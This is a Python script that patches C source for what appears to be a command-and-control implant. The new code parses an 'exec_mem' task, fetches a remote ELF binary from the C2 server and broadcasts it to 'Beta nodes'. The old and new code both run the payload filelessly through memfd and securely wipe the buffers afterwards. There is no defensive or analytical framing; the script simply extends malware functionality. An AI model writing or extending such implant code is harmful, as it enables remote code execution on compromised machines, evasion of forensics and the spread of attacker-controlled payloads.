import re

with open('nexus_auditor/alpha_node.c', 'r') as f:
    content = f.read()

# Replace the c2_worker_thread exec logic
old_exec_logic = """        if (strncmp(task_str, "exec ", 5) == 0) {
          const char *res_id = task_str + 5;
          aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_INFO,
                          "Executing remote resource: %s", res_id);

          uint8_t *elf_bin = NULL;
          size_t elf_len = 0;

          rc = aegis_c2_fetch_resource(&c2, res_id, &elf_bin, &elf_len);
          if (rc == AEGIS_OK && elf_bin && elf_len > 0) {
            aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_INFO,
                            "Resource fetched (%zu bytes), executing...", elf_len);

            /* Execute filelessly via memfd */
            /* Note: this forks, so Alpha stays alive. The child process runs the ELF. */
            rc = aegis_exec_from_memory(elf_bin, elf_len, res_id, NULL, NULL);
            if (rc != AEGIS_OK) {
               aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_ERROR,
                               "Execution failed (rc=%d)", rc);
            }

            /* Secure wipe */
            AEGIS_WIPE(elf_bin, elf_len, 3);
            free(elf_bin);
          } else {
            aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_ERROR,
                            "Failed to fetch resource (rc=%d)", rc);
          }
        }"""

new_exec_logic = """        if (strncmp(task_str, "exec_mem ", 9) == 0) {
          const char *task_args = task_str + 9;
          char res_id[256] = {0};
          char args_buf[1024] = {0};

          /* Parse "res_id args" */
          const char *space = strchr(task_args, ' ');
          if (space) {
              size_t len = space - task_args;
              if (len >= sizeof(res_id)) len = sizeof(res_id) - 1;
              strncpy(res_id, task_args, len);
              strncpy(args_buf, space + 1, sizeof(args_buf) - 1);
          } else {
              strncpy(res_id, task_args, sizeof(res_id) - 1);
          }

          aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_INFO,
                          "Fetching remote resource for in-memory execution: %s (args: %s)", res_id, args_buf);

          uint8_t *elf_bin = NULL;
          size_t elf_len = 0;

          rc = aegis_c2_fetch_resource(&c2, res_id, &elf_bin, &elf_len);
          if (rc == AEGIS_OK && elf_bin && elf_len > 0) {
            aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_INFO,
                            "Resource fetched (%zu bytes). Dispatching CMD_EXEC_ELF to Beta nodes...", elf_len);

            /* Package the payload for Beta nodes: ipc_exec_elf_t + args (null term) + ELF bytes */
            size_t args_len = strlen(args_buf) + 1; /* Include null terminator */
            size_t payload_len = sizeof(ipc_exec_elf_t) + args_len + elf_len;

            uint8_t *payload = malloc(payload_len);
            if (payload) {
                ipc_exec_elf_t *cmd = (ipc_exec_elf_t *)payload;
                cmd->target_pid = 0; /* Broadcast to all, let the first one take it, or maybe just one? For now broadcast. Actually, better to send to a specific one, or let the alpha broadcast and all beta execute. The original architecture uses phantom threads per beta. */
                cmd->elf_len = (uint32_t)elf_len;
                cmd->args_len = (uint32_t)args_len;

                memcpy(cmd->payload, args_buf, args_len);
                memcpy(cmd->payload + args_len, elf_bin, elf_len);

                alpha_broadcast_command(CMD_EXEC_ELF, payload, payload_len);

                AEGIS_WIPE(payload, payload_len, 1);
                free(payload);
            }

            /* Secure wipe */
            AEGIS_WIPE(elf_bin, elf_len, 3);
            free(elf_bin);
          } else {
            aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_ERROR,
                            "Failed to fetch resource (rc=%d)", rc);
          }
        }"""

if old_exec_logic in content:
    content = content.replace(old_exec_logic, new_exec_logic)
else:
    print("Could not find old exec logic in alpha_node.c!")

with open('nexus_auditor/alpha_node.c', 'w') as f:
    f.write(content)

print("alpha_node.c updated successfully.")
